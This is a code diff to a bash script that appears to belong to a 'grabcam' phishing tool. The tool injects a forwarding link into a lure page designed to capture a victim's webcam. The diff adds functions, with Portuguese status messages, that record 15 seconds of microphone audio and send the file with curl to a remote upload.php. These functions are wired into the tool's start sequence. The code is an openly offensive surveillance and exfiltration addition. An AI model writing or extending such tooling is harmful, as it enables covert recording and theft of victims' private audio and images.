@@ -195,6 +195,18 @@ sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 }
 
+record_audio() {
+    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Gravando áudio por 15 segundos...\e[0m\n"
+    rec -q -r 44100 -b 16 -c 1 -e signed-integer -t raw - trim 0 15 | lame -q 9 -b 45 --resample 22.05 - audio.mp3 > /dev/null 2>&1
+    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Áudio gravado com sucesso!\e[0m\n"
+}
+
+upload_audio() {
+    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enviando áudio para o servidor...\e[0m\n"
+    curl -F "audio=@audio.mp3" $send_link/upload.php > /dev/null 2>&1
+    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Áudio enviado com sucesso!\e[0m\n"
+}
+
 start() {
 default_choose_sub="Y"
 default_subdomain="grabcam$RANDOM"
@@ -211,6 +223,8 @@ fi
 
 server
 payload
+record_audio
+upload_audio
 checkfound
 }
 
